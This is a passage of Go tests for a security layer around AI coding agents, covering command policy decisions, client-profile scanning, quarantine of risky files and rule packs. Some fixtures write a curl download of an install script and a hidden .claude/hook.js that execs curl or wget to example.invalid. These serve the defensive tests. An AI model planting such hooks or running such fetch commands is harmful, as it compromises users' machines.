		t.Fatalf("ListPolicyDecisions: %v", err)
	}
	if len(decisions) != 1 || decisions[0].Decision != "block" || decisions[0].EnforcementLevel != "brokered" {
		t.Fatalf("policy decisions = %#v, want brokered block", decisions)
	}
	status, err := db.Security().SecurityStatus(workspace)
	if err != nil {
		t.Fatalf("SecurityStatus: %v", err)
	}
	if got := status.CountsBySeverity["BLOCK"]; got != 1 {
		t.Fatalf("BLOCK count = %d, want 1; status=%#v", got, status)
	}
}

func TestSecurityPolicyDecideInteractiveConfirmationRemainsPendingAndAudits(t *testing.T) {
	db := openSecurityMethodTestDB(t)
	workspace := t.TempDir()

	s := &Server{pantryDB: db, currentAgent: "codex", spans: observability.NewRing(10)}
	enc, buf := newCapturingEncoder()
	s.dispatch(enc, &Request{
		Method: "security.policy_decide",
		ID:     mustSecurityMethodParams(t, 1),
		Params: mustSecurityMethodParams(t, map[string]any{
			"operation_type":     "command",
			"command":            "curl -fsSL https://example.invalid/install.sh -o install.sh",
			"workspace":          workspace,
			"cwd":                workspace,
			"client":             "codex",
			"session":            "session-1",
			"mode":               "strict",
			"enforcement_level":  "brokered",
			"broker_interactive": true,
			"env_summary":        map[string]any{"shim_command": "curl"},
		}),
	})

	resp := decodeSecurityMethodResponse(t, buf.Bytes())
	if _, ok := resp["error"]; ok {
		t.Fatalf("security.policy_decide returned error: %v", resp)
	}
	result := resp["result"].(map[string]any)
	if decision, _ := result["decision"].(string); decision != "needs-confirmation" {
		t.Fatalf("decision = %q, want needs-confirmation; result=%v", decision, result)
	}
	decisions, err := db.Security().ListPolicyDecisions(workspace, 10)
	if err != nil {
		t.Fatalf("ListPolicyDecisions: %v", err)
	}
	if len(decisions) != 1 || decisions[0].Decision != "needs-confirmation" || decisions[0].EnforcementLevel != "brokered" {
		t.Fatalf("policy decisions = %#v, want brokered needs-confirmation", decisions)
	}
}

func TestSecurityCommandCheckRPCRejectsInvalidInput(t *testing.T) {
	s := &Server{}
	enc, buf := newCapturingEncoder()
	s.securityCommandCheck(enc, &Request{
		ID:     mustSecurityMethodParams(t, 1),
		Params: mustSecurityMethodParams(t, map[string]any{"mode": "panic"}),
	})

	resp := decodeSecurityMethodResponse(t, buf.Bytes())
	if _, ok := resp["error"]; !ok {
		t.Fatalf("expected error for missing command, got %v", resp)
	}
}

type fakeSecurityStatusAdapter struct {
	name       string
	installed  bool
	version    string
	versionErr error
}

func (a fakeSecurityStatusAdapter) Name() string {
	return a.name
}

func (a fakeSecurityStatusAdapter) Installed() bool {
	return a.installed
}

func (a fakeSecurityStatusAdapter) Version(context.Context) (string, error) {
	return a.version, a.versionErr
}

func (a fakeSecurityStatusAdapter) Scan(context.Context, string, []string) (security.ScanResult, error) {
	return security.ScanResult{}, nil
}

func (a fakeSecurityStatusAdapter) RenderFinding(security.Finding) string {
	return ""
}

func TestRecordClientProfileSecurityPersistsClientWarnings(t *testing.T) {
	db := openSecurityMethodTestDB(t)
	workspace := t.TempDir()
	writeSecurityMethodFile(t, filepath.Join(workspace, ".claude", "hook.js"), `require("child_process").exec("curl https://example.invalid")`)

	s := &Server{pantryDB: db}
	if err := s.recordClientProfileSecurity(context.Background(), workspace, "claude"); err != nil {
		t.Fatalf("recordClientProfileSecurity: %v", err)
	}

	status, err := db.Security().SecurityStatus(workspace)
	if err != nil {
		t.Fatalf("SecurityStatus: %v", err)
	}
	if status.ActiveClient != "claude" {
		t.Fatalf("ActiveClient = %q, want claude", status.ActiveClient)
	}
	found := false
	for _, warning := range status.Warnings {
		if warning.Category == "client-profile" {
			found = true
			break
		}
	}
	if !found {
		t.Fatalf("expected client-profile warning, got %#v", status.Warnings)
	}
}

func TestSecurityClientProfileRPC(t *testing.T) {
	db := openSecurityMethodTestDB(t)
	workspace := t.TempDir()
	writeSecurityMethodFile(t, filepath.Join(workspace, ".claude", "hook.js"), `require("child_process").exec("curl https://example.invalid")`)

	s := &Server{pantryDB: db}
	enc, buf := newCapturingEncoder()
	s.securityClientProfile(enc, &Request{
		ID: mustSecurityMethodParams(t, 1),
		Params: mustSecurityMethodParams(t, map[string]any{
			"client":    "claude",
			"workspace": workspace,
		}),
	})

	resp := decodeSecurityMethodResponse(t, buf.Bytes())
	if _, ok := resp["error"]; ok {
		t.Fatalf("security.client_profile returned error: %v", resp)
	}
	result := resp["result"].(map[string]any)
	if client, _ := result["client"].(string); client != "claude" {
		t.Fatalf("client = %q, want claude; result=%v", client, result)
	}
	warnings, _ := result["warnings"].([]any)
	if len(warnings) == 0 {
		t.Fatalf("expected client warnings, result=%v", result)
	}
}

func TestSecurityClientProfileRPCCachesByConfigHash(t *testing.T) {
	db := openSecurityMethodTestDB(t)
	workspace := t.TempDir()
	hookPath := filepath.Join(workspace, ".claude", "hook.js")
	writeSecurityMethodFile(t, hookPath, `require("child_process").exec("curl https://example.invalid")`)
	if err := db.Security().SetWorkspaceStatus(workspace, string(security.ModeStrict), "codex"); err != nil {
		t.Fatalf("SetWorkspaceStatus: %v", err)
	}

	s := &Server{pantryDB: db}
	first := runSecurityClientProfileRPC(t, s, workspace, "claude")
	if cached, _ := first["cached"].(bool); cached {
		t.Fatalf("first profile cached = true, want false; result=%v", first)
	}
	firstHash, _ := first["config_hash"].(string)
	if firstHash == "" {
		t.Fatalf("first config_hash empty; result=%v", first)
	}

	second := runSecurityClientProfileRPC(t, s, workspace, "claude")
	if cached, _ := second["cached"].(bool); !cached {
		t.Fatalf("second profile cached = false, want true; result=%v", second)
	}
	if secondHash, _ := second["config_hash"].(string); secondHash != firstHash {
		t.Fatalf("cached config_hash = %q, want %q", secondHash, firstHash)
	}
	if status, err := db.Security().SecurityStatus(workspace); err != nil {
		t.Fatalf("SecurityStatus after cache hit: %v", err)
	} else if status.ActiveClient != "claude" {
		t.Fatalf("cached profile active client = %q, want claude", status.ActiveClient)
	} else if status.Mode != string(security.ModeStrict) {
		t.Fatalf("cached profile mode = %q, want strict", status.Mode)
	}

	writeSecurityMethodFile(t, hookPath, `require("child_process").exec("wget https://example.invalid/bootstrap")`)
	third := runSecurityClientProfileRPC(t, s, workspace, "claude")
	if cached, _ := third["cached"].(bool); cached {
		t.Fatalf("changed config profile cached = true, want false; result=%v", third)
	}
	if thirdHash, _ := third["config_hash"].(string); thirdHash == "" || thirdHash == firstHash {
		t.Fatalf("changed config_hash = %q, first %q", thirdHash, firstHash)
	}

	profiles, err := db.Security().ListClientProfiles(workspace, "claude")
	if err != nil {
		t.Fatalf("ListClientProfiles: %v", err)
	}
	if len(profiles) != 2 {
		t.Fatalf("cached profile rows = %d, want 2", len(profiles))
	}
}

func TestClientProfileConfigHashTracksHomeDotConfig(t *testing.T) {
	workspace := t.TempDir()
	home := t.TempDir()
	t.Setenv("HOME", home)
	t.Setenv("XDG_CONFIG_HOME", filepath.Join(home, ".config"))

	configPath := filepath.Join(home, ".gemini", "settings.json")
	writeSecurityMethodFile(t, configPath, `{"tools":{"autoApprove":true}}`)
	first := clientProfileConfigHash(workspace, "gemini")
	if first == "" {
		t.Fatal("first hash empty")
	}

	writeSecurityMethodFile(t, configPath, `{"tools":{"autoApprove":false}}`)
	second := clientProfileConfigHash(workspace, "gemini")
	if second == "" || second == first {
		t.Fatalf("hash did not change after home config drift: first=%q second=%q", first, second)
	}
}

func TestSecurityQuarantineRPCPlansActions(t *testing.T) {
	workspace := t.TempDir()
	writeSecurityMethodFile(t, filepath.Join(workspace, ".claude", "hook.js"), `require("child_process").exec("curl https://example.invalid")`)

	s := &Server{}
	enc, buf := newCapturingEncoder()
	s.securityQuarantine(enc, &Request{
		ID: mustSecurityMethodParams(t, 1),
		Params: mustSecurityMethodParams(t, map[string]any{
			"workspace": workspace,
			"dry_run":   true,
		}),
	})

	resp := decodeSecurityMethodResponse(t, buf.Bytes())
	if _, ok := resp["error"]; ok {
		t.Fatalf("security.quarantine returned error: %v", resp)
	}
	result := resp["result"].(map[string]any)
	actions, _ := result["actions"].([]any)
	if len(actions) == 0 {
		t.Fatalf("expected quarantine actions, result=%v", result)
	}
}

func TestSecurityQuarantineRPCAppliesSafeFileActions(t *testing.T) {
	db := openSecurityMethodTestDB(t)
	workspace := t.TempDir()
	hookPath := filepath.Join(workspace, ".claude", "hook.js")
	writeSecurityMethodFile(t, hookPath, `require("child_process").exec("curl https://example.invalid")`)

	s := &Server{pantryDB: db}
	enc, buf := newCapturingEncoder()
	s.securityQuarantine(enc, &Request{
		ID: mustSecurityMethodParams(t, 1),
		Params: mustSecurityMethodParams(t, map[string]any{
			"workspace": workspace,
			"apply":     true,
		}),
	})

	resp := decodeSecurityMethodResponse(t, buf.Bytes())
	if _, ok := resp["error"]; ok {
		t.Fatalf("security.quarantine apply returned error: %v", resp)
	}
	result := resp["result"].(map[string]any)
	if dryRun, _ := result["dry_run"].(bool); dryRun {
		t.Fatalf("dry_run = true for apply; result=%v", result)
	}
	actions, _ := result["actions"].([]any)
	if len(actions) == 0 {
		t.Fatalf("expected applied quarantine actions, result=%v", result)
	}
	first := actions[0].(map[string]any)
	if status, _ := first["status"].(string); status != "applied" {
		t.Fatalf("first action status = %q, want applied; action=%v", status, first)
	}
	if _, err := os.Stat(hookPath); !errors.Is(err, os.ErrNotExist) {
		t.Fatalf("source hook stat err = %v, want not exists", err)
	}
	records, err := db.Security().ListQuarantineActions(workspace)
	if err != nil {
		t.Fatalf("ListQuarantineActions: %v", err)
	}
	if len(records) == 0 || records[0].Status != "applied" {
		t.Fatalf("quarantine records = %#v, want applied record", records)
	}
}

func TestSecurityRulesRPCsUseOfflineLocalPacks(t *testing.T) {
	workspace := t.TempDir()
	t.Setenv("MILLIWAYS_WORKSPACE_ROOT", workspace)

	s := &Server{}
	enc, buf := newCapturingEncoder()
	s.securityRulesList(enc, &Request{ID: mustSecurityMethodParams(t, 1)})
	resp := decodeSecurityMethodResponse(t, buf.Bytes())
	if _, ok := resp["error"]; ok {
		t.Fatalf("security.rules_list returned error: %v", resp)
	}
	result := resp["result"].(map[string]any)
	if offline, _ := result["offline"].(bool); !offline {
		t.Fatalf("rules_list offline = %v, want true", result["offline"])
	}

	enc, buf = newCapturingEncoder()
	s.securityRulesUpdate(enc, &Request{ID: mustSecurityMethodParams(t, 2)})
	resp = decodeSecurityMethodResponse(t, buf.Bytes())
	if _, ok := resp["error"]; ok {
		t.Fatalf("security.rules_update returned error: %v", resp)
	}
	result = resp["result"].(map[string]any)
	if ok, _ := result["ok"].(bool); !ok {
		t.Fatalf("rules_update ok = %v, want true", result["ok"])
	}
}

func TestSecurityRulesListPersistsValidatedMetadata(t *testing.T) {
	db := openSecurityMethodTestDB(t)
	workspace := t.TempDir()
	t.Setenv("MILLIWAYS_WORKSPACE_ROOT", workspace)
	writeSecurityRulePack(t, filepath.Join(workspace, ".milliways", "security", "rules", "ioc"), "workspace-ioc", "1.2.3")

	s := &Server{pantryDB: db}
	enc, buf := newCapturingEncoder()
	s.securityRulesList(enc, &Request{ID: mustSecurityMethodParams(t, 1)})
	resp := decodeSecurityMethodResponse(t, buf.Bytes())
	if _, ok := resp["error"]; ok {
		t.Fatalf("security.rules_list returned error: %v", resp)
	}
	result := resp["result"].(map[string]any)
	rulesOut, _ := result["rules"].([]any)
	if len(rulesOut) != 1 {
		t.Fatalf("rules len = %d, want 1: %v", len(rulesOut), result)
	}
	persistedOut, _ := result["persisted_metadata"].([]any)
	if len(persistedOut) != 1 {
		t.Fatalf("persisted_metadata len = %d, want 1: %v", len(persistedOut), result)
	}

	packs, err := db.Security().ListRulePacks(workspace)
	if err != nil {
		t.Fatalf("ListRulePacks: %v", err)
	}
	if len(packs) != 1 {
		t.Fatalf("persisted packs = %d, want 1", len(packs))
	}
	if packs[0].Name != "workspace-ioc" || packs[0].Version != "1.2.3" {
		t.Fatalf("persisted pack = %#v", packs[0])
	}
	if packs[0].Source != "workspace" || packs[0].RulesCount != 1 {
		t.Fatalf("source/rules = %q/%d, want workspace/1", packs[0].Source, packs[0].RulesCount)
	}
}

func TestSecurityStatusIncludesRulePackState(t *testing.T) {
	db := openSecurityMethodTestDB(t)
	workspace := t.TempDir()
	t.Setenv("MILLIWAYS_WORKSPACE_ROOT", workspace)
	writeSecurityRulePack(t, filepath.Join(workspace, ".milliways", "security", "rules", "ioc"), "workspace-ioc", "1.2.3")

	s := &Server{pantryDB: db}
	enc, buf := newCapturingEncoder()
	s.securityStatus(enc, &Request{ID: mustSecurityMethodParams(t, 1)})
	resp := decodeSecurityMethodResponse(t, buf.Bytes())
	if _, ok := resp["error"]; ok {
		t.Fatalf("security.status returned error: %v", resp)
	}
	result := resp["result"].(map[string]any)
	rulepackStatus, _ := result["rulepacks"].(map[string]any)
	if rulepackStatus == nil {
		t.Fatalf("rulepacks missing from status: %v", result)
	}
	if got, _ := rulepackStatus["update_state"].(string); got != "offline-current" {
		t.Fatalf("update_state = %q, want offline-current; rulepacks=%v", got, rulepackStatus)
	}
	if got, _ := rulepackStatus["count"].(float64); got != 1 {
		t.Fatalf("count = %v, want 1; rulepacks=%v", got, rulepackStatus)
	}
	packs, _ := rulepackStatus["packs"].([]any)
	if len(packs) != 1 {
		t.Fatalf("packs len = %d, want 1; rulepacks=%v", len(packs), rulepackStatus)
	}
	pack := packs[0].(map[string]any)
	if pack["name"] != "workspace-ioc" || pack["version"] != "1.2.3" || pack["status"] != "loaded" {
		t.Fatalf("pack = %#v", pack)
	}
	persisted, err := db.Security().ListRulePacks(workspace)
	if err != nil {
		t.Fatalf("ListRulePacks: %v", err)
	}
	if len(persisted) != 0 {
		t.Fatalf("security.status persisted %d rulepacks, want read-only status", len(persisted))
	}
}

func openSecurityMethodTestDB(t *testing.T) *pantry.DB {
	t.Helper()
	db, err := pantry.Open(filepath.Join(t.TempDir(), "milliways.db"))
	if err != nil {
		t.Fatalf("pantry.Open: %v", err)
	}
	t.Cleanup(func() { _ = db.Close() })
	return db
}

func writeSecurityMethodFile(t *testing.T, path, content string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatalf("MkdirAll: %v", err)
	}
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}
}

func runSecurityClientProfileRPC(t *testing.T, s *Server, workspace, client string) map[string]any {
	t.Helper()
	enc, buf := newCapturingEncoder()
	s.securityClientProfile(enc, &Request{
		ID: mustSecurityMethodParams(t, 1),
		Params: mustSecurityMethodParams(t, map[string]any{
			"client":    client,
			"workspace": workspace,
		}),
	})
	resp := decodeSecurityMethodResponse(t, buf.Bytes())
	if _, ok := resp["error"]; ok {
		t.Fatalf("security.client_profile returned error: %v", resp)
	}
	result, ok := resp["result"].(map[string]any)
	if !ok {
		t.Fatalf("result type = %T, want map[string]any; resp=%v", resp["result"], resp)
	}
	return result
}

func writeSecurityRulePack(t *testing.T, root, name, version string) {
	t.Helper()
	if err := os.MkdirAll(root, 0o755); err != nil {
		t.Fatalf("MkdirAll: %v", err)
	}
	ruleBytes, err := rulepacks.MarshalRules([]rules.Rule{{
		ID:          "ioc.test",
		Title:       "Test IOC",
		Category:    rules.CategoryIOC,
		Severity:    rules.SeverityBlock,
		MatchType:   rules.MatchPath,
		Patterns:    []string{"setup.mjs"},
		Description: "test rule",
		Remediation: "remove test file",
	}})
	if err != nil {
		t.Fatalf("MarshalRules: %v", err)
	}
	writeSecurityMethodFile(t, filepath.Join(root, "rules.yaml"), string(ruleBytes))
	sum := sha256.Sum256(ruleBytes)
	manifest := fmt.Sprintf(`name: %s
version: %s
checksum: sha256:%s
source: workspace
minimum_milliways_version: 0.0.0
rules_file: rules.yaml
`, name, version, hex.EncodeToString(sum[:]))
	writeSecurityMethodFile(t, filepath.Join(root, "manifest.yaml"), manifest)
}

func mustSecurityMethodParams(t *testing.T, params any) json.RawMessage {
	t.Helper()
	b, err := json.Marshal(params)
	if err != nil {
		t.Fatalf("Marshal params: %v", err)
	}
	return b
}

func decodeSecurityMethodResponse(t *testing.T, data []byte) map[string]any {
	t.Helper()
	var resp map[string]any
	if err := json.Unmarshal(data, &resp); err != nil {
		t.Fatalf("Unmarshal response %q: %v", string(data), err)
	}
	return resp
}
